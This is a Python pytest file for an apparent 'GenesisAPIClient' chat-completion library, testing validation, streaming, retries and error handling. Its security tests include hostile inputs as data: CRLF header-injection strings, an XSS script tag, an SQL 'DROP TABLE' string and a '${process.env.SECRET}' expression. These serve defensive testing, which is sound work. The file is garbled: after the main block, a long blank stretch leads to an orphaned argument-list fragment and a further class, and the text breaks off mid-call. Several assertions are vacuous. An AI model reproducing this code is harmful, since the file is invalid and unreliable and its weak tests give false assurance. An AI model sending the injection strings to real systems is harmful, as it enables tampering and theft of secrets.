        mock_response = {
            'id': 'long-conversation',
            'choices': [{'message': {'content': 'Long conversation processed'}}],
            'usage': {'total_tokens': 5000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=long_conversation,
                model_config=sample_model_config
            )
            
            assert result.id == 'long-conversation'

    @pytest.mark.asyncio
    async def test_streaming_connection_error(self, client, sample_messages, sample_model_config):
        """
        Test that a connection error during streaming chat completion raises a GenesisAPIError with an appropriate message.
        """
        import aiohttp
        
        with patch('aiohttp.ClientSession.post', side_effect=aiohttp.ClientConnectionError()):
            with pytest.raises(GenesisAPIError, match="Connection error"):
                async for chunk in client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ):
                    pass

    @pytest.mark.asyncio
    async def test_streaming_malformed_chunks(self, client, sample_messages, sample_model_config):
        """
        Test that the client correctly skips malformed JSON chunks and processes valid ones during streaming chat completion responses.
        
        This test simulates a streaming API response containing both malformed and valid JSON chunks, verifying that only valid chunks are processed and yielded by the client.
        """
        async def mock_malformed_stream():
            """
            Asynchronously yields a sequence of byte strings simulating a malformed and a valid streaming API response chunk.
            
            Yields:
                bytes: First a malformed JSON chunk, then a valid data chunk.
            """
            yield b'{"invalid": json}'  # Malformed JSON
            yield b'data: {"choices": [{"delta": {"content": "test"}}]}'  # Valid
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_malformed_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            # Should skip malformed chunks and process valid ones
            assert len(chunks) >= 0

    def test_validate_messages_mixed_content_types(self, client):
        """
        Test that message validation fails when a message contains invalid content types, such as None.
        
        Ensures that the client raises a ValidationError when any message in the list has content set to None, even if other messages are valid.
        """
        mixed_messages = [
            ChatMessage(role="user", content="Valid string content"),
            ChatMessage(role="assistant", content=None),  # Invalid None content
        ]
        
        with pytest.raises(ValidationError, match="Message content cannot be None"):
            client._validate_messages(mixed_messages)

    def test_validate_messages_whitespace_only_content(self, client):
        """
        Test that message validation rejects messages containing only whitespace content.
        
        Asserts that a ValidationError is raised when a message's content consists solely of whitespace characters.
        """
        whitespace_messages = [
            ChatMessage(role="user", content="   \t\n   ")  # Only whitespace
        ]
        
        with pytest.raises(ValidationError, match="Message content cannot be empty"):
            client._validate_messages(whitespace_messages)

    def test_validate_model_config_boundary_values(self, client):
        """
        Tests that the model configuration validation accepts minimum and maximum boundary values for temperature, top_p, and max_tokens without raising errors.
        """
        # Test exact boundary values
        config = ModelConfig(name="test-model")
        
        # Test minimum valid values
        config.temperature = 0.0
        config.top_p = 0.0
        config.max_tokens = 1
        client._validate_model_config(config)  # Should not raise
        
        # Test maximum valid values
        config.temperature = 2.0
        config.top_p = 1.0
        config.max_tokens = 999999
        client._validate_model_config(config)  # Should not raise

    def test_validate_model_config_none_values(self, client):
        """
        Test that model config validation raises a ValidationError when temperature is set to None.
        """
        config = ModelConfig(name="test-model")
        config.temperature = None
        
        with pytest.raises(ValidationError, match="Temperature cannot be None"):
            client._validate_model_config(config)

    @pytest.mark.asyncio
    async def test_custom_timeout_behavior(self, mock_config):
        """
        Test that the GenesisAPIClient applies a custom timeout value and raises GenesisAPIError on request timeout.
        """
        custom_config = mock_config.copy()
        custom_config['timeout'] = 5
        
        client = GenesisAPIClient(**custom_config)
        
        with patch('aiohttp.ClientSession.post', side_effect=asyncio.TimeoutError()):
            with pytest.raises(GenesisAPIError, match="Request timeout"):
                await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="test")],
                    model_config=ModelConfig(name="test-model")
                )

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff(self, client, sample_messages, sample_model_config):
        """
        Test that the client retries failed requests using exponential backoff when server errors occur.
        
        This test simulates repeated server errors and verifies that the retry logic triggers exponential backoff delays between attempts.
        """
        call_times = []
        
        async def mock_failing_post(*args, **kwargs):
            """
            Simulates a failed HTTP POST request by returning a mock response with a 500 status code and a server error message.
            
            This mock is intended for testing retry and error handling logic in asynchronous HTTP client code.
            """
            call_times.append(asyncio.get_event_loop().time())
            mock_response = Mock()
            mock_response.status = 500
            mock_response.json = AsyncMock(return_value={'error': {'message': 'Server error'}})
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_failing_post):
            with patch('asyncio.sleep') as mock_sleep:
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                
                # Verify exponential backoff was attempted
                assert mock_sleep.call_count >= 1

    def test_build_headers_with_none_custom_headers(self, client):
        """
        Test that the header builder returns default headers when None is provided for custom headers.
        """
        headers = client._build_headers(None)
        
        assert 'Authorization' in headers
        assert headers['Content-Type'] == 'application/json'

    def test_build_headers_override_default_headers(self, client):
        """
        Test that custom headers provided to the client override the default headers in the request.
        """
        custom_headers = {
            'Content-Type': 'text/plain',
            'Authorization': 'Bearer custom-token'
        }
        headers = client._build_headers(custom_headers)
        
        assert headers['Content-Type'] == 'text/plain'
        assert headers['Authorization'] == 'Bearer custom-token'


class TestDataModelsAdvanced:
    """Advanced tests for data model classes."""
    
    def test_chat_message_equality(self):
        """
        Test that ChatMessage instances with identical attributes are considered equal, and those with differing attributes are not.
        """
        msg1 = ChatMessage(role="user", content="Hello")
        msg2 = ChatMessage(role="user", content="Hello")
        msg3 = ChatMessage(role="user", content="World")
        
        assert msg1 == msg2
        assert msg1 != msg3

    def test_chat_message_immutability(self):
        """
        Verify that ChatMessage instances are immutable by asserting that modifying an attribute raises an AttributeError.
        """
        message = ChatMessage(role="user", content="Hello")
        
        # Attempting to modify should raise an error or have no effect
        with pytest.raises(AttributeError):
            message.role = "assistant"

    def test_model_config_extreme_values(self):
        """
        Test that ModelConfig accepts and correctly stores extreme but valid parameter values.
        """
        config = ModelConfig(
            name="test-model",
            max_tokens=1,
            temperature=0.0,
            top_p=0.0,
            frequency_penalty=-2.0,
            presence_penalty=2.0
        )
        
        assert config.max_tokens == 1
        assert config.temperature == 0.0
        assert config.frequency_penalty == -2.0

    def test_api_response_with_none_data(self):
        """
        Test that an APIResponse instance can be created with None as the data attribute and that its status_code and data are set correctly.
        """
        response = APIResponse(
            status_code=204,
            data=None,
            headers={}
        )
        
        assert response.status_code == 204
        assert response.data is None

    def test_chat_completion_with_empty_choices(self):
        """
        Test that a ChatCompletion instance can be created with an empty choices list and zero token usage.
        """
        completion = ChatCompletion(
            id="empty-choices",
            object="chat.completion",
            created=1677610602,
            model="test-model",
            choices=[],
            usage={'total_tokens': 0}
        )
        
        assert len(completion.choices) == 0
        assert completion.usage['total_tokens'] == 0

    def test_chat_completion_serialization(self):
        """
        Test that a ChatCompletion instance can be serialized to a JSON string.
        
        Asserts that the serialized output is a string and contains the expected identifier.
        """
        completion = ChatCompletion(
            id="serialize-test",
            object="chat.completion",
            created=1677610602,
            model="test-model",
            choices=[],
            usage={'total_tokens': 10}
        )
        
        # Should be serializable
        json_str = json.dumps(completion.__dict__)
        assert isinstance(json_str, str)
        assert "serialize-test" in json_str


class TestExceptionHandlingAdvanced:
    """Advanced exception handling test scenarios."""
    
    def test_exception_chaining(self):
        """
        Verify that custom exceptions correctly chain underlying exceptions using the `__cause__` attribute.
        """
        original_error = ValueError("Original error")
        api_error = GenesisAPIError("API error", status_code=500)
        api_error.__cause__ = original_error
        
        assert api_error.__cause__ is original_error

    def test_rate_limit_error_with_zero_retry_after(self):
        """
        Test that RateLimitError correctly sets the retry_after attribute to zero when initialized with retry_after=0.
        """
        error = RateLimitError("Rate limited", retry_after=0)
        assert error.retry_after == 0

    def test_rate_limit_error_with_none_retry_after(self):
        """
        Test that a RateLimitError instance correctly handles a None value for retry_after.
        """
        error = RateLimitError("Rate limited", retry_after=None)
        assert error.retry_after is None

    def test_exception_message_formatting(self):
        """
        Test that the string representation of a GenesisAPIError includes the expected placeholder in its message.
        """
        error = GenesisAPIError("Test error with {placeholder}", status_code=400)
        assert "placeholder" in str(error)

    def test_validation_error_with_field_info(self):
        """
        Test that ValidationError includes specific field information in its error message.
        """
        error = ValidationError("Invalid field 'temperature': must be between 0 and 2")
        assert "temperature" in str(error)
        assert "0 and 2" in str(error)


class TestUtilityFunctionsAdvanced:
    """Advanced tests for utility functions."""
    
    def test_format_timestamp_edge_cases(self):
        """
        Test that `format_timestamp` returns a string for zero, negative, and very large timestamp values.
        """
        from app.ai_backend.genesis_api import format_timestamp
        
        # Test with zero timestamp
        formatted_zero = format_timestamp(0)
        assert isinstance(formatted_zero, str)
        
        # Test with negative timestamp
        formatted_negative = format_timestamp(-1)
        assert isinstance(formatted_negative, str)
        
        # Test with very large timestamp
        formatted_large = format_timestamp(9999999999)
        assert isinstance(formatted_large, str)

    def test_calculate_token_usage_empty_messages(self):
        """
        Test that `calculate_token_usage` returns zero estimated tokens when given an empty message list.
        """
        from app.ai_backend.genesis_api import calculate_token_usage
        
        usage = calculate_token_usage([])
        assert usage['estimated_tokens'] == 0

    def test_calculate_token_usage_unicode_content(self):
        """
        Test that `calculate_token_usage` correctly estimates token usage for messages containing Unicode characters.
        """
        from app.ai_backend.genesis_api import calculate_token_usage
        
        unicode_messages = [
            ChatMessage(role="user", content="测试 unicode 🌍"),
            ChatMessage(role="assistant", content="Réponse en français")
        ]
        
        usage = calculate_token_usage(unicode_messages)
        assert isinstance(usage['estimated_tokens'], int)
        assert usage['estimated_tokens'] > 0

    @pytest.mark.parametrize("content,min_tokens", [
        ("Single", 1),
        ("Multiple words here", 3),
        ("A much longer sentence with many words to test", 9),
        ("Short", 1),
    ])
    def test_estimate_tokens_minimum_bounds(self, content, min_tokens):
        """
        Test that the token estimation function returns at least the specified minimum number of tokens for given content.
        
        Parameters:
            content (str): The input string to estimate tokens for.
            min_tokens (int): The minimum expected token count.
        """
        from app.ai_backend.genesis_api import estimate_tokens
        
        tokens = estimate_tokens(content)
        assert tokens >= min_tokens

    def test_estimate_tokens_with_special_characters(self):
        """
        Test that the token estimation function returns a positive integer for input containing special characters and punctuation.
        """
        from app.ai_backend.genesis_api import estimate_tokens
        
        special_content = "Hello, world! How are you? I'm fine. 123-456-7890."
        tokens = estimate_tokens(special_content)
        assert isinstance(tokens, int)
        assert tokens > 0

    def test_estimate_tokens_with_newlines_and_tabs(self):
        """
        Test that the token estimation function correctly counts tokens in strings containing newlines and tabs.
        """
        from app.ai_backend.genesis_api import estimate_tokens
        
        whitespace_content = "Line 1\nLine 2\tTabbed content\n\nDouble newline"
        tokens = estimate_tokens(whitespace_content)
        assert isinstance(tokens, int)
        assert tokens > 0


class TestSecurityAndValidation:
    """Security-focused test scenarios."""
    
    def test_api_key_validation_empty_string(self):
        """
        Test that initializing the GenesisAPIClient with an empty API key string raises a ValueError.
        """
        with pytest.raises(ValueError, match="API key is required"):
            GenesisAPIClient(api_key="")

    def test_api_key_validation_whitespace_only(self):
        """
        Test that initializing the client with a whitespace-only API key raises a ValueError.
        """
        with pytest.raises(ValueError, match="API key is required"):
            GenesisAPIClient(api_key="   \t\n   ")

    def test_url_validation_invalid_schemes(self):
        """
        Test that initializing GenesisAPIClient with an invalid base URL scheme raises a ValueError.
        """
        with pytest.raises(ValueError, match="Invalid base URL"):
            GenesisAPIClient(api_key="test-key", base_url="ftp://invalid.com")

    def test_header_injection_prevention(self, client):
        """
        Test that the client prevents header injection by sanitizing or rejecting headers containing carriage return or newline characters.
        """
        malicious_headers = {
            'X-Custom': 'value\r\nX-Injected: malicious',
            'Authorization': 'Bearer token\nX-Another: injected'
        }
        
        headers = client._build_headers(malicious_headers)
        
        # Headers should be sanitized or rejected
        for key, value in headers.items():
            assert '\r' not in str(value)
            assert '\n' not in str(value)

    def test_message_content_script_injection(self, client):
        """
        Test that messages containing potentially malicious script or injection content do not trigger client-side validation errors.
        
        Ensures that the client does not reject messages with script tags, SQL injection patterns, or template expressions, delegating content filtering to the API. Only length or format-related validation errors are considered acceptable.
        """
        malicious_messages = [
            ChatMessage(role="user", content="<script>alert('xss')</script>"),
            ChatMessage(role="user", content="'; DROP TABLE users; --"),
            ChatMessage(role="user", content="${process.env.SECRET}")
        ]
        
        # Should not raise validation errors for content (filtering is API's job)
        try:
            client._validate_messages(malicious_messages)
        except ValidationError as e:
            # Only acceptable validation errors are length/format related
            assert "content too long" in str(e) or "content cannot be empty" in str(e)


class TestEdgeCaseScenarios:
    """Edge case and boundary condition tests."""
    
    @pytest.mark.asyncio
    async def test_simultaneous_close_calls(self, client):
        """
        Test that calling close() multiple times concurrently on the client does not raise errors and results in the session being closed.
        """
        # Call close multiple times
        await asyncio.gather(
            client.close(),
            client.close(),
            client.close()
        )
        
        assert client.session.closed

    @pytest.mark.asyncio
    async def test_request_after_close(self, client, sample_messages, sample_model_config):
        """
        Test that making a request after the client has been closed raises a GenesisAPIError indicating the session is closed.
        """
        await client.close()
        
        with pytest.raises(GenesisAPIError, match="Client session is closed"):
            await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )

    def test_model_config_with_all_none_optional_params(self):
        """
        Test that ModelConfig can be created with all optional parameters set to None.
        
        Verifies that the ModelConfig instance correctly assigns the required name and gracefully handles None values for all optional parameters.
        """
        config = ModelConfig(
            name="test-model",
            max_tokens=None,
            temperature=None,
            top_p=None,
            frequency_penalty=None,
            presence_penalty=None
        )
        
        assert config.name == "test-model"
        # Should handle None values gracefully

    @pytest.mark.asyncio
    async def test_context_manager_exception_during_init(self, mock_config):
        """
        Test that the async context manager raises an exception if session initialization fails.
        
        Verifies that an exception during `GenesisAPIClient` session creation is properly propagated when using the async context manager.
        """
        with patch('aiohttp.ClientSession', side_effect=Exception("Session init failed")):
            with pytest.raises(Exception, match="Session init failed"):
                async with GenesisAPIClient(**mock_config) as client:
                    pass

    @pytest.mark.parametrize("invalid_role", [
        "",
        None,
        123,
        [],
        {},
        "INVALID",
        "User",  # Wrong case
        "assistant ",  # Trailing space
    ])
    def test_message_validation_comprehensive_invalid_roles(self, client, invalid_role):
        """
        Test that the client raises a ValidationError when validating messages with invalid roles.
        
        Parameters:
            invalid_role (str): A role value that is not permitted for a chat message.
        """
        invalid_messages = [
            ChatMessage(role=invalid_role, content="Test content")
        ]
        
        with pytest.raises(ValidationError):
            client._validate_messages(invalid_messages)

    @pytest.mark.asyncio
    async def test_streaming_with_no_chunks(self, client, sample_messages, sample_model_config):
        """
        Test that streaming chat completion yields no results when the API returns no chunks.
        """
        async def empty_stream():
            # Empty async generator
            """
            An asynchronous generator that yields no values.
            
            This can be used as a placeholder or to simulate an empty async stream in tests.
            """
            return
            yield  # This line is never reached
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=empty_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            assert len(chunks) == 0

    @pytest.mark.asyncio
    async def test_concurrent_streaming_requests(self, client, sample_messages, sample_model_config):
        """
        Test that multiple concurrent streaming chat completion requests return the expected number of streamed chunks for each request.
        
        Verifies that the client can handle several simultaneous streaming requests, with each stream yielding the correct sequence of response chunks.
        """
        mock_chunks = [
            {'choices': [{'delta': {'content': f'Stream {i}'}}]}
            for i in range(3)
        ]
        
        async def mock_stream():
            """
            Asynchronously yields encoded JSON chunks from the `mock_chunks` iterable, simulating a streaming API response.
            """
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Start multiple streams concurrently
            streams = [
                client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                for _ in range(3)
            ]
            
            results = []
            for stream in streams:
                chunks = []
                async for chunk in stream:
                    chunks.append(chunk)
                results.append(chunks)
            
            assert len(results) == 3
            for result in results:
                assert len(result) == 3


class TestMockingAndIsolation:
    """Tests focused on proper mocking and test isolation."""
    
    @pytest.mark.asyncio
    async def test_session_cleanup_on_exception(self, mock_config):
        """
        Verify that the HTTP session is properly closed when an exception occurs during an API request within the async context manager.
        """
        with patch('aiohttp.ClientSession.post', side_effect=Exception("Test exception")):
            try:
                async with GenesisAPIClient(**mock_config) as client:
                    await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content="test")],
                        model_config=ModelConfig(name="test-model")
                    )
            except Exception:
                pass
            
            # Session should still be closed after exception
            assert client.session.closed

    def test_fixture_isolation(self, client):
        """
        Verify that the client fixture is isolated between tests by modifying its state and ensuring changes do not persist across tests.
        """
        # Modify client state
        original_api_key = client.api_key
        client.api_key = "modified-key"
        
        # In next test, fixture should be fresh
        assert client.api_key != original_api_key

    @pytest.mark.asyncio
    async def test_mock_response_side_effects(self, client, sample_messages, sample_model_config):
        """
        Simulate multiple consecutive API failures followed by a success to test client retry logic.
        
        This test verifies that the client correctly retries after transient server errors and ultimately returns a successful response when the API recovers.
        """
        responses = [
            {'status': 500, 'json': {'error': {'message': 'Server error 1'}}},
            {'status': 500, 'json': {'error': {'message': 'Server error 2'}}},
            {'status': 200, 'json': {
                'id': 'success-after-failures',
                'choices': [{'message': {'content': 'Success'}}],
                'usage': {'total_tokens': 10}
            }}
        ]
        
        call_count = 0
        
        async def mock_side_effect(*args, **kwargs):
            """
            Simulates sequential asynchronous HTTP responses for mocking purposes.
            
            Returns a mock response object with status and JSON payload based on the current call count, advancing through the provided `responses` list on each invocation.
            """
            nonlocal call_count
            response_data = responses[call_count]
            call_count += 1
            
            mock_response = Mock()
            mock_response.status = response_data['status']
            mock_response.json = AsyncMock(return_value=response_data['json'])
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_side_effect):
            with patch('asyncio.sleep'):
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'success-after-failures'
                assert call_count == 3


if __name__ == "__main__":
    # Run with additional markers for the new test categories
    pytest.main([
        __file__, 
        "-v", 
        "--tb=short",
        "-m", "not (integration or performance)",  # Run unit tests by default
        "--durations=10"  # Show slowest 10 tests
    ])


























































































































































































































































































































































































































































































































































































































































































































































        "--tb=short",
        "-k", "TestGenesisAPIClientRobustness or TestAdvancedStreamingScenarios or TestDataValidationEdgeCases or TestErrorRecoveryPatterns or TestPerformanceCharacteristics or TestConfigurationValidation or TestUtilityFunctionsComprehensive",
        "--durations=5"
    ])

class TestGenesisAPIClientCoverage:
    """Additional comprehensive test coverage for edge cases and boundary conditions."""
    
    @pytest.fixture
    def client_with_debug_mode(self, mock_config):
        """Create a client with debug mode enabled for testing debug scenarios."""
        debug_config = mock_config.copy()
        debug_config['debug'] = True
        return GenesisAPIClient(**debug_config)
    
    def test_client_initialization_with_debug_mode(self, client_with_debug_mode):
        """Test that client correctly initializes with debug mode enabled."""
        assert hasattr(client_with_debug_mode, 'debug')
        # Verify debug mode doesn't interfere with basic functionality
        assert client_with_debug_mode.api_key is not None
    
    def test_client_initialization_with_proxy_config(self, mock_config):
        """Test client initialization with proxy configuration."""
        proxy_config = mock_config.copy()
        proxy_config['proxy'] = 'http://proxy.example.com:8080'
        
        client = GenesisAPIClient(**proxy_config)
        assert hasattr(client, 'proxy') or client.proxy is None  # Handle gracefully
    
    def test_client_initialization_with_ssl_config(self, mock_config):
        """Test client initialization with SSL verification disabled."""
        ssl_config = mock_config.copy()
        ssl_config['verify_ssl'] = False
        
        client = GenesisAPIClient(**ssl_config)
        # Should initialize without errors
        assert client.api_key == ssl_config['api_key']
    
    @pytest.mark.parametrize("invalid_timeout", [
        -1, 0, -10.5, "invalid", None, float('inf'), float('-inf')
    ])
    def test_client_initialization_comprehensive_invalid_timeouts(self, invalid_timeout):
        """Test that various invalid timeout values raise appropriate errors."""
        if invalid_timeout is None:
            # None might be acceptable as a default
            try:
                client = GenesisAPIClient(api_key='test-key', timeout=invalid_timeout)
                assert client.timeout is None or client.timeout > 0
            except ValueError:
                pass  # Acceptable to reject None
        else:
            with pytest.raises(ValueError, match="Timeout must be positive"):
                GenesisAPIClient(api_key='test-key', timeout=invalid_timeout)
    
    @pytest.mark.parametrize("invalid_retries", [
        -1, -10, "invalid", float('inf'), float('-inf')
    ])
    def test_client_initialization_comprehensive_invalid_retries(self, invalid_retries):
        """Test that various invalid max_retries values raise appropriate errors."""
        with pytest.raises(ValueError, match="Max retries must be non-negative"):
            GenesisAPIClient(api_key='test-key', max_retries=invalid_retries)
    
    def test_client_initialization_with_custom_user_agent(self, mock_config):
        """Test client initialization with custom user agent."""
        custom_config = mock_config.copy()
        custom_config['user_agent'] = 'CustomApp/1.0'
        
        client = GenesisAPIClient(**custom_config)
        headers = client._build_headers()
        assert 'User-Agent' in headers
        # Should contain either custom or default user agent
        assert len(headers['User-Agent']) > 0
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_function_calling(self, client, sample_model_config):
        """Test chat completion with function calling parameters."""
        function_schema = {
            "name": "get_weather",
            "description": "Get current weather",
            "parameters": {
                "type": "object",
                "properties": {
                    "location": {"type": "string"}
                }
            }
        }
        
        messages = [ChatMessage(role="user", content="What's the weather in NYC?")]
        
        mock_response = {
            'id': 'func-call-test',
            'choices': [{
                'message': {
                    'role': 'assistant',
                    'content': None,
                    'function_call': {
                        'name': 'get_weather',
                        'arguments': '{"location": "NYC"}'
                    }
                }
            }],
            'usage': {'total_tokens': 50}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that function calling doesn't break the client
            result = await client.create_chat_completion(
                messages=messages,
                model_config=sample_model_config
            )
            
            assert result.id == 'func-call-test'
            assert result.choices[0].message.content is None
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_tool_use(self, client, sample_model_config):
        """Test chat completion with tool use parameters."""
        tools = [{
            "type": "function",
            "function": {
                "name": "calculate",
                "description": "Perform calculations",
                "parameters": {"type": "object"}
            }
        }]
        
        messages = [ChatMessage(role="user", content="Calculate 2+2")]
        
        mock_response = {
            'id': 'tool-use-test',
            'choices': [{
                'message': {
                    'role': 'assistant',
                    'content': 'I can help you calculate that.',
                    'tool_calls': [{
                        'id': 'call_123',
                        'type': 'function',
                        'function': {
                            'name': 'calculate',
                            'arguments': '{"expression": "2+2"}'
                        }
                    }]
                }
            }],
            'usage': {'total_tokens': 45}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=messages,
                model_config=sample_model_config
            )
            
            assert result.id == 'tool-use-test'
            assert 'tool_calls' in result.choices[0].message.__dict__ or result.choices[0].message.content is not None
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_response_format(self, client, sample_messages, sample_model_config):
        """Test chat completion with specific response format requirements."""
        # Test JSON response format
        sample_model_config.response_format = {"type": "json_object"}
        
        mock_response = {
            'id': 'json-format-test',
            'choices': [{
                'message': {
                    'role': 'assistant',
                    'content': '{"result": "formatted response"}'
                }
            }],
            'usage': {'total_tokens': 30}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            assert result.id == 'json-format-test'
            # Verify JSON content can be parsed
            import json
            parsed = json.loads(result.choices[0].message.content)
            assert parsed['result'] == 'formatted response'
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_system_fingerprint(self, client, sample_messages, sample_model_config):
        """Test chat completion response with system fingerprint."""
        mock_response = {
            'id': 'fingerprint-test',
            'system_fingerprint': 'fp_12345abcde',
            'choices': [{
                'message': {
                    'role': 'assistant',
                    'content': 'Response with fingerprint'
                }
            }],
            'usage': {'total_tokens': 25}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            assert result.id == 'fingerprint-test'
            assert hasattr(result, 'system_fingerprint') or 'system_fingerprint' in result.__dict__
    
    @pytest.mark.asyncio
    async def test_streaming_with_function_calls(self, client, sample_messages, sample_model_config):
        """Test streaming chat completion with function calls."""
        mock_chunks = [
            {'choices': [{'delta': {'function_call': {'name': 'get_weather', 'arguments': '{"loc'}}}]},
            {'choices': [{'delta': {'function_call': {'arguments': 'ation": "NYC"}'}}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'function_call'}]}
        ]
        
        async def mock_function_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_function_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            assert len(chunks) == 3
            # Verify function call streaming works
            assert chunks[-1].choices[0].finish_reason == 'function_call'
    
    @pytest.mark.asyncio
    async def test_streaming_with_empty_deltas(self, client, sample_messages, sample_model_config):
        """Test streaming with empty delta objects."""
        mock_chunks = [
            {'choices': [{'delta': {}}]},  # Empty delta
            {'choices': [{'delta': {'content': 'Hello'}}]},
            {'choices': [{'delta': {}}]},  # Another empty delta
            {'choices': [{'delta': {'content': ' world'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_empty_delta_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_empty_delta_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            assert len(chunks) == 5
            # Verify empty deltas are handled properly
            content_chunks = [c for c in chunks if hasattr(c.choices[0].delta, 'content') and c.choices[0].delta.content]
            assert len(content_chunks) == 2
    
    @pytest.mark.asyncio
    async def test_streaming_with_role_deltas(self, client, sample_messages, sample_model_config):
        """Test streaming with role information in deltas."""
        mock_chunks = [
            {'choices': [{'delta': {'role': 'assistant'}}]},
            {'choices': [{'delta': {'content': 'Hello'}}]},
            {'choices': [{'delta': {'content': ' there'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_role_delta_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_role_delta_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            assert len(chunks) == 4
            # Verify role is set in first chunk
            assert chunks[0].choices[0].delta.role == 'assistant'
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_multiple_choices(self, client, sample_messages, sample_model_config):
        """Test chat completion with multiple response choices."""
        sample_model_config.n = 3  # Request 3 choices
        
        mock_response = {
            'id': 'multiple-choices-test',
            'choices': [
                {
                    'index': 0,
                    'message': {'role': 'assistant', 'content': 'First choice'},
                    'finish_reason': 'stop'
                },
                {
                    'index': 1,
                    'message': {'role': 'assistant', 'content': 'Second choice'},
                    'finish_reason': 'stop'
                },
                {
                    'index': 2,
                    'message': {'role': 'assistant', 'content': 'Third choice'},
                    'finish_reason': 'length'
                }
            ],
            'usage': {'total_tokens': 75}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            assert len(result.choices) == 3
            assert result.choices[0].message.content == 'First choice'
            assert result.choices[1].message.content == 'Second choice'
            assert result.choices[2].message.content == 'Third choice'
            assert result.choices[2].finish_reason == 'length'
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_logprobs(self, client, sample_messages, sample_model_config):
        """Test chat completion with log probabilities."""
        sample_model_config.logprobs = True
        sample_model_config.top_logprobs = 3
        
        mock_response = {
            'id': 'logprobs-test',
            'choices': [{
                'message': {
                    'role': 'assistant',
                    'content': 'Hello world'
                },
                'logprobs': {
                    'content': [
                        {
                            'token': 'Hello',
                            'logprob': -0.1,
                            'top_logprobs': [
                                {'token': 'Hello', 'logprob': -0.1},
                                {'token': 'Hi', 'logprob': -0.5}
                            ]
                        }
                    ]
                }
            }],
            'usage': {'total_tokens': 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
